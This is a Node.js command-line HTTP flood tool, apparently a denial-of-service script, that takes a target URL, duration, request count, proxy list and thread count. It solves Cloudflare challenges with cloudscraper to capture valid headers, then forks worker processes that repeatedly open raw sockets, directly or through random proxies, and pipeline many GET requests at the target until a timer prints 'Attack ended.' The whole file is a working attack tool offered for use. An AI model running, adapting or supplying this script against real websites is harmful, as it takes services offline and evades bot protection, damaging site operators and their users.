require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs'),
    CloudScraper = require('cloudscraper'),
    path = require('path'),
    cluster = require('cluster'),
    net = require('net'),
    url = require('url'),
    random_useragent = require('random-useragent');
if (process.argv.length !== 8) {
    console.log(`
Usage: node ${path.basename(__filename)} [url] [time] [req_per_ip] [proxies] [thread] [on/off]
Usage: node ${path.basename(__filename)} http://example.com 60 100 proxy.txt 5 on
					By: Wachira Choomsiri`);
    process.exit(0);
}

const target = process.argv[2],
    time = process.argv[3],
    req_per_ip = process.argv[4],
    threads = process.argv[6],
    proxymode = process.argv[7];
const host = url.parse(target).host;

let proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);

function send_req_proxy() {
    let proxy = proxies[Math.floor(Math.random() * proxies.length)];
    var proxies = proxy.split(':');
    let getHeaders = new Promise(function (resolve, reject) {
        CloudScraper({
            uri: target,
            resolveWithFullResponse: true,
            proxy: 'http://' + proxy,
            challengesToSolve: 10,
            headers: {'User-Agent':random_useragent.getRandom()}
        }, function (error, response) {
            if (error) {
                //console.log(error)
                return start();
            }
			//console.log(response)
            let headers = '';
            Object.keys(response.request.headers).forEach(function (i, e) {
                if (['content-length', 'Upgrade-Insecure-Requests', 'Accept-Encoding'].includes(i)) {
                    return;
                }
                headers += i + ': ' + response.request.headers[i] + '\r\n';
            });
            resolve(headers);
        });
    });
    getHeaders.then(function (result) {
        var client = new net.Socket();
        client.connect(proxies[1], proxies[0]);
        client.setTimeout(10000);
        var headers = `GET ${target} HTTP/1.1\r\n` + result + '\r\n\r\n'
        //console.log(headers)
        for (let i = 0; i < req_per_ip; ++i) {
            client.write(headers)
        }
        client.on('data', function (data) {
			//console.log(''+data)
            setTimeout(function () {
                client.destroy();
                return delete client;
            }, 10000);
        });
    });
}
function send_req_raw(useragent) {
    let getHeaders = new Promise(function (resolve, reject) {
        CloudScraper({
            uri: target,
            resolveWithFullResponse: true,
            challengesToSolve: 10,
            headers: {'User-Agent': useragent}
        }, function (error, response) {
            if (error) {
                //console.log(error)
                return start();
            }
			//console.log(response)
            let headers = '';
            Object.keys(response.request.headers).forEach(function (i, e) {
                if (['content-length', 'Upgrade-Insecure-Requests', 'Accept-Encoding'].includes(i)) {
                    return;
                }
                headers += i + ': ' + response.request.headers[i] + '\r\n';
            });
            resolve(headers);
        });
    });
    getHeaders.then(function (result) {
        var client = new net.Socket();
        client.connect(host, 80);
        client.setTimeout(10000);
        var headers = `GET ${target} HTTP/1.1\r\n` + result + '\r\n\r\n'
        //console.log(headers)
        for (let i = 0; i < req_per_ip; ++i) {
            client.write(headers)
        }
        client.on('data', function () {
            setTimeout(function () {
                client.destroy();
                return delete client;
            }, 10000);
        });
    });
}
function run(){
    if (proxymode == 'on') {
        setInterval(() => {
            send_req_proxy();
        });
    } else if (proxymode == 'off') {
		var useragent = random_useragent.getRandom()
        setInterval(() => {
            send_req_raw(useragent);
        });
    } else {
        console.log('on/off')
    }
}

function main(){
    if (cluster.isMaster) {
        for (let i = 0; i < threads; i++) {
            cluster.fork();
        }
        cluster.on('exit', (worker, code, signal) => {
            console.log(`Threads: ${worker.process.pid} ended`);
        });
    } else {
        run();
        console.log(`Threads: ${process.pid} started`);
    }
}

main();

setTimeout(() => {
    console.log('Attack ended.');
    process.exit(0)
}, time * 1000);

process.on('uncaughtException', function (err) {
    // console.log(err);
});
process.on('unhandledRejection', function (err) {
    // console.log(err);
});
